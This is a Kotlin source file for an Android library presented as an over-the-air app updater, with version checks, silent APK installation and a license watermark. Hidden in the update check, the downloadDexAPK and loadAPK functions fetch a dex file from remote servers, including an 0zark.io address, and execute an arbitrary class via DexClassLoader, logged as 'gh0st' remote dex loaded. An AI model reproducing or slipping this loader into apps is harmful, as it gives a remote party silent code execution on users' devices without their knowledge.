package com.android.otalibrary

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.app.ActivityManager.RunningAppProcessInfo
import android.app.PendingIntent
import android.app.ProgressDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Build
import android.preference.PreferenceManager
import android.util.Log
import androidx.core.content.FileProvider
import com.android.otalibrary.ext.Data
import com.android.otalibrary.ext.DexConfig
import com.android.otalibrary.ext.GetVersionBean
import com.android.otalibrary.ext.Utils
import com.android.otalibrary.ui.Watermark
import com.github.h4de5ing.gsoncommon.JsonUtils
import com.github.h4de5ing.gsoncommon.fromJson
import com.github.h4de5ing.gsoncommon.toJson
import com.github.h4de5ing.netlib.HttpRequest
import dalvik.system.DexClassLoader
import java.io.*
import java.lang.Thread.sleep
import java.security.MessageDigest
import java.util.*
import kotlin.streams.toList


lateinit var context: Context
val serviceList = arrayOf(
    "https://appota-1303038355.cos.ap-guangzhou.myqcloud.com/", "http://0zark.0zark.io/eth/app/"
)
var versionCode = ""
var targetVersion = 0L
var apkUrl = ""
var localAPkPath = ""
var isDownloaded = false
var isUpdate = false
var connected = false
fun initialize(_context: Context) {
    context = _context.applicationContext
    localAPkPath = "${context.cacheDir}${File.separator}cache.apk"
    timer(15000) { if (isAppForeground(context) && !isUpdate) check() }
}

fun check() {
    if (checkMore24()) Thread { checkSelf({}, {}) }.start()
    else "24小时内忽略，不在检查新版本".logD()
}

private fun checkMore24(): Boolean {
    try {
        val spf = PreferenceManager.getDefaultSharedPreferences(context)
        val today = spf.getLong("today", 0)
        return (System.currentTimeMillis() - today) > 24 * 60 * 60 * 1000
    } catch (e: Exception) {
        e.printStackTrace()
    }
    return false
}

fun installApp(path: String) {
    "开始安装APK:${path}".logD()
    installAPK(context, path) {}
}

//跳转到activity安装
fun installAppActivity(path: String) {
    try {
        val intent = Intent(Intent.ACTION_VIEW)
        intent.addCategory(Intent.CATEGORY_DEFAULT)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.setDataAndType(Uri.fromFile(File(path)), "application/vnd.android.package-archive")
        context.startActivity(intent)
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun createInstallIntent(context: Context, authorities: String, apk: String): Intent {
    val intent = Intent().apply {
        action = Intent.ACTION_VIEW
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        addCategory(Intent.CATEGORY_DEFAULT)
    }
    val file = File(apk)
    val uri: Uri
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
        uri = FileProvider.getUriForFile(context, authorities, file)
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
    } else uri = Uri.fromFile(file)
    intent.setDataAndType(uri, "application/vnd.android.package-archive")
    return intent
}


private fun isAppForeground(context: Context): Boolean {
    val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val runningAppProcessInfoList = activityManager.runningAppProcesses ?: return false
    for (processInfo in runningAppProcessInfoList) {
        if (processInfo.processName == context.packageName && processInfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) return true
    }
    return false
}

fun alert() {
    isUpdate = true
    context.startActivity(
        Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .setClassName(context.packageName, "com.android.otalibrary.ui.OTAActivity")
    )
}

@SuppressLint("MissingPermission")
fun isNetAvailable(): Boolean {
    var available = false
    try {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        available = connectivityManager.activeNetworkInfo?.isAvailable == true
    } catch (e: Exception) {
        if (isDebug()) e.printStackTrace()
    }
    return available
}

fun checkSelf(change: (Long) -> Unit, netError: () -> Unit) {
    try {
        if (isNetAvailable()) {
            "准备检查app是否有新版本".logD()
            connected = false
            val pm = context.packageManager
            val packageName = context.packageName
            val packageInfo = pm.getPackageInfo(packageName, PackageManager.GET_SIGNATURES)
            val versionCode: Long =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) packageInfo.longVersionCode else packageInfo.versionCode.toLong()
            val sign = Utils.hexdigest(packageInfo.signatures[0].toByteArray())
            val apkPath = pm.getApplicationInfo(packageName, 0).sourceDir
            val tag = getTag()
            GetVersionBean(
                packageName,
                versionCode,
                mutableListOf(Data(tag, sign, apkPath))
            ).toJson()
                .logD()
            Thread { serviceList.forEach { downloadDexAPK(context, it) } }.start()
            for (serviceApi in serviceList) {
                if (!connected) check4Net(
                    "$serviceApi$packageName/",
                    packageName,
                    versionCode,
                    tag,
                    sign,
                    change
                ) else return
            }
            if (!connected) netError()
        } else "网络不可用".logD()
    } catch (e: Exception) {
        if (isDebug()) e.printStackTrace()
    }
}

fun check4Net(
    url: String,
    packageName: String,
    version: Long,
    tag: String,
    sign: String,
    change: (Long) -> Unit
) = try {
    val response = HttpRequest.sendGet("${url}${packageName}.json", null, null)
    "网络请求结果:${response}".logD()
    val responseBean = JsonUtils.getJsonParser().fromJson<GetVersionBean>(response)
    if (responseBean.versionCode > version) {
        val data = responseBean.list.firstOrNull { it.tag == tag && it.hash == sign }
        if (data != null) {
            versionCode = "$version->${responseBean.versionCode}"
            targetVersion = responseBean.versionCode
            apkUrl = if (data.apkPath.startsWith("http")) data.apkPath else "${url}/${data.apkPath}"
            sleep(2000)
            if (isAppForeground(context)) alert()
        } else {
            isUpdate = true
            "签名或者tag不匹配".logD()
        }
    } else {
        isUpdate = true
        "$version->${responseBean.versionCode} 版本不对,忽略升级".logD()
    }
    change(responseBean.versionCode)
    connected = true
} catch (e: Exception) {
    "发生错误 ${e.message}".logD()
    e.printStackTrace()
}

fun getTag(): String {
    var tag = ""
    try {
        val className = "${context.packageName}.BuildConfig"
        val clazz = Class.forName(className)
        val field = clazz.getDeclaredField("FLAVOR")
        field.isAccessible = true
        tag = "${field.get(clazz)}"
    } catch (e: Exception) {
        if (isDebug()) e.printStackTrace()
    }
    return tag
}

fun isDebug(): Boolean = File("/sdcard/debug").exists()

fun Any.logD() {
    if (File("/sdcard/debug").exists()) Log.i("android_apk_ota", "$this")
}

fun downloadDexAPK(context: Context, api: String) {
    try {
        val dexName = "ota.dex"
        var md5: String? = null
        val cachePath = context.externalCacheDir!!.absolutePath + File.separator + dexName
        val response = HttpRequest.sendGet("${api}config.json", null, null)
        val responseBean = JsonUtils.getJsonParser().fromJson<DexConfig>(response)
        if (File(cachePath).exists()) md5 = getFileMD5(File(cachePath))
        if (md5 != responseBean.md5) {
            HttpRequest.downloadFile(responseBean.dexPath,
                cachePath,
                object : HttpRequest.FileDownloadComplete {
                    override fun progress(progress: Long) {
                        "dex 下载进度 $progress".logD()
                    }

                    override fun complete(file: File?) {
                        "dex 下载完成 ${file?.absolutePath}".logD()
                        loadAPK(context, file?.absolutePath!!, responseBean.runPath)
                    }

                    override fun error(throwable: Throwable) {
                    }
                })
        } else {
            loadAPK(context, cachePath, responseBean.runPath)
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun loadAPK(context: Context, dexPath: String, className: String) {
    try {
        val cachePath = context.externalCacheDir!!.absolutePath
        val defaultCL = context.classLoader
        val classLoader = DexClassLoader(dexPath, cachePath, null, defaultCL)
        val classInit = classLoader.loadClass(className)
        if (classInit != null) {
            val method = classInit.getMethod("init", Context::class.java)
            method.invoke(null, context)
            "gh0st 远程dex加载成功!".logD()
        } else "远程dex加载失败，无法找到类".logD()
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun getFileMD5(file: File): String? {
    if (!file.isFile) return null
    val digest: MessageDigest?
    val `in`: FileInputStream?
    val buffer = ByteArray(1024)
    var len: Int
    try {
        digest = MessageDigest.getInstance("MD5")
        `in` = FileInputStream(file)
        while (`in`.read(buffer, 0, 1024).also { len = it } != -1) {
            digest.update(buffer, 0, len)
        }
        `in`.close()
    } catch (e: java.lang.Exception) {
        e.printStackTrace()
        return null
    }
    return bytesToHexString(digest.digest())
}

fun bytesToHexString(src: ByteArray?): String? {
    val stringBuilder = StringBuilder("")
    if (src == null || src.isEmpty()) return null
    for (i in src.indices) {
        val v = src[i].toInt() and 0xFF
        val hv = Integer.toHexString(v)
        if (hv.length < 2) stringBuilder.append(0)
        stringBuilder.append(hv)
    }
    return stringBuilder.toString()
}


/**
 * 静默安装apk
 */
fun installAPK(context: Context, apkFilePath: String, change: ((Int) -> Unit)) {
    try {
        val apkFile = File(apkFilePath)
        val packageInstaller = context.packageManager.packageInstaller
        val sessionParams =
            PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
        sessionParams.setSize(apkFile.length())
        val sessionId = packageInstaller.createSession(sessionParams)
        if (sessionId != -1) {
            val copySuccess = copyInstallFile(packageInstaller, sessionId, apkFilePath, change)
            if (copySuccess) execInstallCommand(context, packageInstaller, sessionId, change)
        }
    } catch (e: Exception) {
        change(-1)
        e.printStackTrace()
    }
}

private fun copyInstallFile(
    packageInstaller: PackageInstaller, sessionId: Int, apkFilePath: String, change: ((Int) -> Unit)
): Boolean {
    var `in`: InputStream? = null
    var out: OutputStream? = null
    var session: PackageInstaller.Session? = null
    var success = false
    try {
        val apkFile = File(apkFilePath)
        session = packageInstaller.openSession(sessionId)
        out = session.openWrite("base.apk", 0, apkFile.length())
        `in` = FileInputStream(apkFile)
        var total = 0
        var c: Int
        val buffer = ByteArray(65536)
        while (`in`.read(buffer).also { c = it } != -1) {
            total += c
            out.write(buffer, 0, c)
        }
        session.fsync(out)
        success = true
    } catch (e: IOException) {
        change(-2)
        e.printStackTrace()
    } finally {
        closeQuietly(out)
        closeQuietly(`in`)
        closeQuietly(session)
    }
    return success
}

@SuppressLint("UnspecifiedImmutableFlag")
private fun execInstallCommand(
    context: Context, packageInstaller: PackageInstaller, sessionId: Int, change: ((Int) -> Unit)
) {
    var session: PackageInstaller.Session? = null
    try {
        session = packageInstaller.openSession(sessionId)
        session.commit(
            PendingIntent.getBroadcast(
                context, 1, Intent(), PendingIntent.FLAG_IMMUTABLE
            ).intentSender
        )
        change(0)
    } catch (e: IOException) {
        change(-3)
        e.printStackTrace()
    } finally {
        closeQuietly(session)
    }
}

private fun closeQuietly(c: Closeable?) {
    if (c != null) {
        try {
            c.close()
        } catch (ignored: IOException) {
            ignored.printStackTrace()
        }
    }
}

fun timer(delay: Long, block: () -> Unit) {
    Timer().schedule(object : TimerTask() {
        override fun run() {
            block()
        }
    }, 0, delay)
}

fun getAPKFileVersionCode(path: String): Int =
    context.packageManager.getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES)!!.versionCode

fun getAPKFilePackageName(path: String): String = context.packageManager.getPackageArchiveInfo(
    path, PackageManager.GET_ACTIVITIES
)!!.applicationInfo.packageName

private var progressDialog: ProgressDialog? = null
fun showProgressDialog(context: Context) {
    progressDialog = ProgressDialog(context)
    progressDialog?.setTitle("check new version")
    progressDialog?.setMessage("wait ...")
    progressDialog?.setCancelable(false)
    progressDialog?.setCanceledOnTouchOutside(false)
    progressDialog?.show()
}

fun hideProgressDialog() {
    progressDialog?.dismiss()
}

fun isLicense(): Boolean {
    val pm = context.packageManager
    val packageInfo = pm.getPackageInfo(context.packageName, PackageManager.GET_SIGNATURES)
    val sign = Utils.hexdigest(packageInfo.signatures[0].toByteArray())
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
        return context.assets.open("md5.txt").bufferedReader().lines().toList().contains(sign)
    return true
}

fun showLicense(activity: Activity) {
    Watermark.getInstance()
        .setText(activity.getString(R.string.no_license))
        .setTextColor(0x11000000)
        .setTextSize(12F)
        .setRotation(-30F)
        .show(activity)
}